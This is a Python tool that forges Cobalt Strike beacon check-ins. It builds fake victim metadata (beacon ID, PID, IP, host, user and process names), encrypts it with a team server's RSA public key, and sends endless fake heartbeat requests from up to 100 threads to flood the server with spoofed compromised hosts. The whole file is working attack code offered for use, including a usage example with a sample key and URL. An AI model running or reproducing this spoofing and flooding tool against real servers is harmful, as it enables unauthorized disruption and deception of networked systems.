'''
cs批量上线
@author: ga0weI
@time: 2022-10-12 night
'''
import base64
import inspect
import os
import random
import sys
import threading
import time
import requests
import argparse
import ctypes

print("""
_________       ___.          .__   __            __         .__ __            ___________       __           ____ _____________ 
\_   ___ \  ____\_ |__ _____  |  |_/  |_  _______/  |________|__|  | __ ____   \_   _____/____  |  | __ ____ |    |   \______   \ 
/    \  \/ /  _ \| __ \\\\__  \ |  |\   __\/  ___/\   __\_  __ \  |  |/ // __ \   |    __) \__  \ |  |/ // __ \|    |   /|     ___/
\     \___(  <_> ) \_\ \/ __ \|  |_|  |  \___ \  |  |  |  | \/  |    <\  ___/   |     \   / __ \|    <\  ___/|    |  / |    |    
 \______  /\____/|___  (____  /____/__| /____  > |__|  |__|  |__|__|_ \\\\___  >  \___  /  (____  /__|_ \\\\___  >______/  |____|    
        \/           \/     \/               \/                      \/    \/       \/        \/     \/    \/                    
""")
print("Cobaltstrike FakeUP Tools                                                                                                        ")
print("                                                      ——————————Create by Ga0weI    ")
try:
    from Crypto.Cipher import PKCS1_v1_5 as Cipher_pksc1_v1_5
    from Crypto.PublicKey import RSA
except ImportError:
    os.system('pip3 install pycryptodome')
    from Crypto.Cipher import PKCS1_v1_5 as Cipher_pksc1_v1_5
    from Crypto.PublicKey import RSA


def getvimtimipfromfile():
    ip = random.choice(list_ip)
    return ip

def getcomputername():
    computer = random.choice(list_cn)
    return  computer

def getusername():
    username = random.choice(list_ur)
    return username

def getprocessname():
    processname = random.choice(list_pn)
    return processname

def getrawkey():
    rawkey = random.choice(list_rawkey)
    return rawkey

def generateyuandatatext():
    # data = bytes('nihao i am ga0wei  abcdefghojklmn', 'utf-8')  # 二进制文件写String
    # data1 = bytes([48, 9, 9, 98, int(0xAB)])  # 二进制文件写10进制 字节 16进制
    # myint = 1024
    # data2 = myint.to_bytes(4, 'little')  # 二进制文件里面写int

    # das = data.decode()
    # print(das)

    '''
     //标志头（4）+Size（4）+Rawkey(16)+字体（4）+beacon ID(4)+ 进程ID（4）+系统内核（6）+09 +失陷IP + 09 + 主机名+ 09 + 用户名+09+进程名
    '''
    signheader = bytes([0, 0, int(0xBE), int(0xEF)])  # 标志头
    character = bytes([int(0xA8), int(0x03), int(0xA8), int(0x03)])  # 字体
    # aes and hmac key
    rawkey = getrawkey()
    #four byte range for num
    b = random.randrange(100000,1000000)
    beaconid = b.to_bytes(4, 'big')  #这里这个属性非常重要，是cs上线元数据的主键
    # beaconid = bytes(4)  #
    c = random.randrange(2000, 50000)
    print("随机pid：{}".format(c))
    processid = c.to_bytes(4, 'big')
    kernel = bytes([0, 0, 4, int(0x36), int(0x2E), int(0x32)])
    board = bytes([9])
    victimipstring = getvimtimipfromfile()
    victimip = bytes(victimipstring, 'utf-8')
    computerstring = getcomputername()
    computer = bytes(computerstring, 'utf-8')
    usernamestring = getusername()
    username = bytes(usernamestring, 'utf-8')
    processnamestring = getprocessname()
    processanme = bytes(processnamestring, 'utf-8')
    print("上线————————pid：{}——————受害IP：{}——————————主机名：{}——————————用户名：{}——————————进程名：{}".format(c,victimip,computer,username,processanme))
    #计算size
    a = len(rawkey) + len(character) + len(beaconid) + len(processid) + len(kernel) + len(victimip) + len(
        computer) + len(username) + len(processanme) + 4
    size = a.to_bytes(4, 'big')

    #元数据
    result = signheader+size+rawkey+character+beaconid+processid+kernel+board+victimip+board+computer+board+username+board+processanme
    # with open(filename, 'wb') as fw:
    #     fw.write(result)
    return  result


def RSAencryprt(pub_keys, yuandata):
    #公钥格式化
    pub_keys = '-----BEGIN PUBLIC KEY-----\n' + pub_keys + '\n-----END PUBLIC KEY-----'
    # print("公钥是：\n{}".format(pub_keys))
    rsakey = RSA.importKey(pub_keys)
    cipher = Cipher_pksc1_v1_5.new(rsakey)
    encrypt_data = cipher.encrypt(yuandata)  # 1.对元数据组成的字符串加密
    cipher_data_tmp = base64.b64encode(encrypt_data)  # 2.对加密后的字符串base64加密
    # print("加密后：\n")
    # print(cipher_data_tmp)
    return cipher_data_tmp



def sendfakeheart(targeturl,cipher):
    # mycookies = "fK3dGUgMOsvWjV02mWE3PJ9QGnhkgsnNhwksVSFfHyw7w1FylnIiaFeHiADvXFeLq7l+FW4wir9+Ckz10jGC36VZ0/CLoM6e/RDjN1I42mgGR3b2lp4BhoMuhaGqVZetmCN3/zeUoHUgfhyqH++eUPEA83Alcg3Jz73486F7zgg=";
    try:
        mycookies = cipher;
        myua = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; MATP; MATP)"

        myheaders = {
            'User-Agent': myua,
            'Cookie': mycookies,
            'Accept': "*/*",
            'Connection': 'Keep-Alive'
        }
        while(1):
            requests.get(targeturl, headers=myheaders)
            time.sleep(10)
    except:
        print("网络连接失败，请输入正确的url并检查本地网络情况")

def _async_raise(ident, SystemExit):
    """raises the exception, performs cleanup if needed"""
    tid = ctypes.c_long(ident)
    if not inspect.isclass(SystemExit):
        exctype = type(SystemExit)
    res = ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, ctypes.py_object(exctype))
    if res == 0:
        raise ValueError("invalid thread id")
    elif res != 1:
        # """if it returns a number greater than one, you're in trouble,
        # and you should call it again with exc=NULL to revert the effect"""
        ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, None)
        raise SystemError("PyThreadState_SetAsyncExc failed")

def run(num):
    a = 0
    print("本次伪造上线{}个machine，相关上线信息如下：（如需停止，关闭该cmd窗口即可）".format(num))
    # 定义一个线程列表
    threads = []
    try:
        while(a<num):
            a=a+1
            # 拿到元数据
            yuandata = generateyuandatatext()
            yuandatacipher = RSAencryprt(pub_keys, yuandata)
            # 连接
            t = threading.Thread(target=sendfakeheart,  args=(targeturl,yuandatacipher,))
            threads.append(t)
            # threading.Thread(
        for i in threads:
            i.start()
    except:
        for i in threads:
            _async_raise(i.ident, SystemExit)


if __name__ == '__main__':

    parser = argparse.ArgumentParser(description='input three parameters please!  eg：npython CobaltstrikeFakeUP.py -T 10 -U http://192.168.129.100/updates.rss -P MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCNUL6+gTcsl1/M1vjCOFsJY2lMm4i5HA4TPki0VH77n57ELBv5H/8pzuWSGtL9n+n+FDiUh4WF84nX6W6dd4Vs8XZEfcbQLpYM10aW0FpVdSVwGxTum9ZilrXMG9UmZOgNtbugwY4eRSxO9ILAnwxXqGbymdSC7VhgSc9E8dNMtQIDAQAB ')
    parser.add_argument('-T', "--thread",type=int, default=5, help="num of fake online machine ")
    parser.add_argument('-P', "--pubkey",type=str, help="Publickey for Encryption",required=1)
    parser.add_argument('-U', "--targeturl",type=str, help="cs callback url",required=1)
    args = parser.parse_args()

    numofmachine = args.thread#上线个数
    if numofmachine>100:
        numofmachine = 100
    #target
    # targeturl = "http://192.168.129.132/updates.rss"
    targeturl = args.targeturl
    #加密
    # pub_keys = "xxxxx"  # 公钥
    # pub_keys = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCNUL6+gTcsl1/M1vjCOFsJY2lMm4i5HA4TPki0VH77n57ELBv5H/8pzuWSGtL9n+n+FDiUh4WF84nX6W6dd4Vs8XZEfcbQLpYM10aW0FpVdSVwGxTum9ZilrXMG9UmZOgNtbugwY4eRSxO9ILAnwxXqGbymdSC7VhgSc9E8dNMtQIDAQAB"  # 公钥
    pub_keys = args.pubkey
    #准备字典资源
    list_ip = []#受害
    list_ur = []#用户名
    list_pn = []#进程名
    list_cn = []#主机名
    list_rawkey = [ #这里随意，都为0也可以
        bytes('aaaaaaaaaaaaaaaa','utf-8'),
        bytes('bbbbbbbbbbbbbbbb','utf-8'),
        bytes('cccccccccccccccc','utf-8'),
        bytes('dddddddddddddddd','utf-8'),
        bytes('ffffffffffffffff','utf-8'),
        bytes('gggggggggggggggg','utf-8'),
        bytes('hhhhhhhhhhhhhhhh','utf-8'),
        bytes('iiiiiiiiiiiiiiii','utf-8'),
        bytes('yyyyyyyyyyyyyyyy','utf-8'),
        bytes('pppppppppppppppp','utf-8'),
        bytes('qqqqqqqqqqqqqqqq','utf-8')
    ]#主机aes和hmac
    #受害IP字典
    try:
        with open("ip.txt",'r') as fip:
            while(1):
                line  = fip.readline().replace('\n','')
                if not line:
                    break
                list_ip.append(line)
        # 用户名
        with open("username.txt",'r') as fur:
            while(1):
                line  = fur.readline().replace('\n','')
                if not line:
                    break
                list_ur.append(line)
        # 进程名
        with open("processname.txt", 'r') as fpn:
            while(1):
                line  = fpn.readline().replace('\n','')
                if not line:
                    break
                list_pn.append(line)
        # 主机名
        with open("computername.txt", 'r') as fcn:
            while(1):
                line  = fcn.readline().replace('\n','')
                if not line:
                    break
                list_cn.append(line)
    except:
        print("Error: please comfirm files(ip.txt username.txt processname.txt computername.txt) exist" )
        sys.exit()
    run(numofmachine)



